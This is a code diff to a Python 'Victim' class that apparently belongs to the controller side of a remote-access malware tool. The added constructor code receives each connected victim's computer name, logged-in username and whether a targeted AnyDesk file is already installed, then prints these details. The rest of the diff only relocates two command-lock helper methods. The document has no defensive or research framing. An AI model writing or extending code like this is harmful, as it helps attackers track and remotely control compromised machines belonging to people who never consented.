@@ -12,12 +12,6 @@ class Victim:
     code = None
     IS_PROCESSING = False
 
-    def _lockCommands(self):
-        self.IS_PROCESSING = True
-
-    def _unlockCommands(self):
-        self.IS_PROCESSING = False
-
     def __init__(self, socket, code=None):
         """
         param 1: the socket of the victim
@@ -29,6 +23,23 @@ class Victim:
 
         self.socket = socket
         self.code = code
+
+        # Gets the computer name
+        self.computerName = self.socket.recv(16).rstrip(b'\x00').decode()
+        # Gets the logged username
+        self.loggedUserName = self.socket.recv(
+            257).rstrip(b'\xfe').rstrip(b'\x00').decode()
+        # Gets if the wanted anydesk file is already installed on this victim's pc
+        self.isAnyDeskInstalled = int.from_bytes(
+            self.socket.recv(4), "big") == 1
+
+        print(f"Vicitm({self.socket.getsockname()}) details:\nComputer Name: {self.computerName}\nLogged Username: {self.loggedUserName}\nIs anydesk already installed? : {self.isAnyDeskInstalled}")
+
+    def _lockCommands(self):
+        self.IS_PROCESSING = True
+
+    def _unlockCommands(self):
+        self.IS_PROCESSING = False
 
     def getAddr(self):
         """
